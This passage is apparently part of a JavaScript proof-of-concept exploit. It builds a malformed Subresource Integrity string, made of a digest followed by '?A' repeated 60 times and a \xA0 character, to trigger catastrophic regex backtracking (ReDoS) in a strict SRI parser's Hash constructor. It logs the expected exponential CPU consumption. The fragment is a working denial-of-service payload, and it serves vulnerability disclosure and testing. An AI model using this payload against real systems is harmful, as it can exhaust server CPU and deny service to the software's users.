   // Each "?A" represents a potential split point between groups. 
   // Concatenating many options and ending with a character outside [\x21-\x7E] (\xA0)
   // forces the regex engine to exhaustively backtrack through all possible partitions.
   const payloadSuffix = '?A'.repeat(60) + '\xA0';

   const malformedSri = `${algorithm}-${digest}${payloadSuffix}`;

   console.log('[*] Triggering ReDoS on STRICT_SRI_REGEX...');
   console.log(`[*] Input length: ${malformedSri.length} bytes`);
   console.log('[*] Expected behavior: Exponential CPU consumption as backtracking options exceed 30,000.');

   // `{ strict: true }` forces the Hash constructor to compile and use STRICT_SRI_REGEX
